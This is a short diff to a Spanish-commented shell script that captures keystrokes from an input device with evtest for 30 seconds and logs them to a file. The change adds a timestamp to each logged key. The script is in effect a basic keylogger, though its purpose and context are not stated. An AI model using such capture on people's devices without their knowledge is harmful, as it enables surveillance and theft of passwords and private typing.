@@ -13,7 +13,7 @@ fi
 echo "[*] Iniciando captura de teclas por 30 segundos..." > "$LOG_FILE"
 
 # Captura teclas en segundo plano y las guarda en archivo
-evtest "$DEVICE" | awk '/EV_KEY/ {print $NF}' >> "$LOG_FILE" &
+evtest "$DEVICE" | awk '/EV_KEY/ {print strftime("[%Y-%m-%d %H:%M:%S]"), $NF}' >> "$LOG_FILE" &
 PID=$!
 
 # Espera 30 segundos antes de detener la captura
